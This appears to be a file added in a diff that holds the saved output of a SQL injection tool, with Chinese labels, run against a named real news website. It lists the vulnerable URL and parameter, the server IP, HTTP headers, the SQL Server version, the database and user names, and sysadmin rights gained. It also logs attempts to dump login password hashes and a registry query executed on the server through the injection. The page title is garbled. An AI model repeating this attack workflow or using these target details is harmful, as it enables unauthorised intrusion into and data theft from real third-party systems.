@@ -1,0 +1,74 @@
+■漏洞信息:============================================================
+ ·URL:http://thedreamnews.com/hope/news_photo/pnews_view1.asp?idx=3405
+ ·页面标题：灌绊 官弗 牢磐齿 脚巩 - 锐噶春胶
+ ·参数:idx=3405
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:61.100.186.157
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 10:07:41 GMT
+Server: Microsoft-IIS/6.0
+Content-Length: 14915
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDSQTSDRSA=ILPPKELADNFMJJKILMHNJEFG; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：news
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.194 (Intel X86) 
+	Aug  6 2000 00:57:48 
+	Copyright (c) 1988-2000 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：COM4U-6TG5XE0D8
+- 服务名：MSSQLSERVER
+- 系统用户名：newsid
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+取记录数失败，使用设定值：5
+Dir of D:: 
+一次性获取失败，正在批次获取……
